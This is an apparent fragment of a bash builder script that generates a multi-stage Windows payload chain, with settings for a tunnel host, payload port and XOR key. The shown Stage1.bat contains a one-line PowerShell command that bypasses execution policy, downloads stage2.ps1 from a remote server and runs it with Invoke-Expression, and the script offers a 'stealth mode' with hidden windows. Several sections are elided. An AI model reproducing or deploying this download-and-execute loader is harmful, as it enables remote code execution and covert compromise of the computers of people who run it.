...
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH=""  # Empty for Vercel root (no subfolder)
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
...
# ============================================
# STEP 3: Create PowerShell stages
# ============================================
echo -e "${YELLOW}[3/6] Creating PowerShell stages...${NC}"
...
try {
    ...
    Write-Host "[Stage3] Executing..." -ForegroundColor Yellow
...
Write-Host "[Stage2] Downloading stage3..." -ForegroundColor Yellow
...
# ============================================
# STEP 4: Create FIXED Stage1.bat (CRITICAL - ONE LINE POWERSHELL)
# ============================================
echo -e "${YELLOW}[4/6] Creating FIXED Stage1.bat (one-line PowerShell)...${NC}"

if [ $VISIBLE_MODE -eq 1 ]; then
    # VISIBLE MODE - Shows windows with proper one-line PowerShell
...
echo ========================================
echo.
echo [!] Downloading stage2.ps1...
echo     URL: $FULL_BASE_URL/payloads/stage2.ps1
echo.

:: IMPORTANT: This is a SINGLE LINE PowerShell command - DO NOT break it!
powershell.exe -NoP -NonI -Exec Bypass -Command "try { \$webUrl='$FULL_BASE_URL'; Write-Host '[PowerShell] Downloading...' -ForegroundColor Yellow; \$script = (New-Object Net.WebClient).DownloadString(\"\$webUrl/payloads/stage2.ps1\"); Write-Host ('[PowerShell] Downloaded ' + \$script.Length + ' bytes') -ForegroundColor Green; Write-Host '[PowerShell] Executing...' -ForegroundColor Yellow; Invoke-Expression \$script; } catch { Write-Host ('[PowerShell] ERROR: ' + \$_.Exception.Message) -ForegroundColor Red; Write-Host 'Press any key...' -ForegroundColor Cyan; \$null = \$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); }"
...
EOF
    ...
    # STEALTH MODE - Hidden windows with proper one-line PowerShell
    cat > payloads/stage1.bat << EOF
@echo off
